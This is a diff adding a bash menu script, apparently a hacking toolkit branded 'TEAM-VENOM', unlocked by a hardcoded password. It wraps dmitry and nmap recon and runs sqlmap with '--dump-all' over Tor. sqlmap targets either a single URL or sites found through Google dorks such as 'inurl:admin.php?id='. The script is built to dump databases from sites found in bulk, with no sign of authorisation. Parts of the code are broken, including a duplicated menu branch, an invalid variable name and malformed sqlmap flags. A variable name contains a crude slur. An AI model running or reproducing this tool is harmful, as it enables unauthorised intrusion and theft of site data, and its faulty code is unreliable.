@@ -1,0 +1,68 @@
+#!/usr/bin/bash
+dd="$(date)"
+echo "| Developed by 4evil x crossi    |" | lolcat
+echo "ENTER PASSWORD to UNLOCK" | lolcat
+read pass
+if [ $pass == GRSXM2LMBI======Y3Jvc3NpCg== ];then
+echo "|################################|" | lolcat
+echo "| TEAM-VENOM [JAI-MAHAKAL]       |" | lolcat
+echo "| Developed by 4evil x crossi    |" | lolcat
+echo "| $dd|" | lolcat
+echo "|################################|" | lolcat
+echo "                                  "
+echo "--------------------------------------------------"|lolcat
+echo "[1] RECON                                        |"|lolcat
+echo "[2] SQLinjection [automate single website]       |"|lolcat
+echo "[3] SQLinjection [multiple target using dorks]   |"|lolcat
+echo "[4] VULNERBILITY [50% bugs can be found if any]  |"|lolcat
+echo "[5] EXIT                                         |"|lolcat
+echo "--------------------------------------------------"|lolcat
+echo "Choose the below options" | lolcat 
+read pro
+if [ $pro -eq 1 ] ; then 
+echo "--------------------------------------------------"
+echo "Input Target //pkmb.com or www.pkmb.com//"|lolcat
+echo "                                          "
+read pkmb 
+echo "DATA from RIPE database,e-mail,subdomain"|lolcat
+dmi="dmitry -i -e -s -o $pkmb"
+$dmi
+echo "--------------------------------------------------"
+echo "                                                  "
+echo "PORTS AND VERSION SCANNING //may take some time//" |lolcat 
+sorry=
+map="nmap  -O -sV -oN $pkmb.ports $pkmb"
+$map
+echo "OUTPUT WILL BE SAVE IN DIR $pkmb"| lolcat
+mkdir $pkmb && mv $.txt $pkmb.ports $pkmb
+echo "Possible inforamtions about target is done,have a bounty day"|lolcat 
+echo ":),ok bye now."|lolcat
+elif [ $pro -eq 2 ];then
+echo "Enter target //https://pkmb.com/any.php?id=1//" | lolcat
+read imranpussy
+beta="sqlmap -u $imranpussy --tor level 3 --risk 5 --dump-all"
+$beta
+echo "                                                "
+echo "If website will be vulnerable data will be dumped at location /root/.local/share/sqlmap/output/" | lolcat
+echo ":),ok bye.|lolcat" | lolcat 
+elif [ $pro -eq 3 ];then 
+echo "Enter the dork //inurl:admin.php?id=//" | lolcat 
+read sqld
+mind="sqlmap -g $sqld --tor level 3 --risk 5 --dump-all"
+$mind
+echo ":),ok bye now." |lolcat
+elif [ $pro -eq 3 ];then
+echo "THIS IF FULLY AUTOMATE AND WILL TAKE FEW MORE TIME, as it will scan each aspects that hunter do manually but you need to confim the vulnerbility founded during scan" | lolcat 
+echo "Enter target //https://website.com//" | lolcat 
+read codex
+mkdir $codex
+4evil="wapiti -u $codex -o $codex"
+$codex
+echo ":),ok bye now.|lolcat"
+else 
+echo "TOOL SHUTING DOWN"| lolcat 
+echo ":),ok bye now."|lolcat
+fi
+else 
+echo "wrong pass contact:crossi1782004@gmail.com" | lolcat
+fi
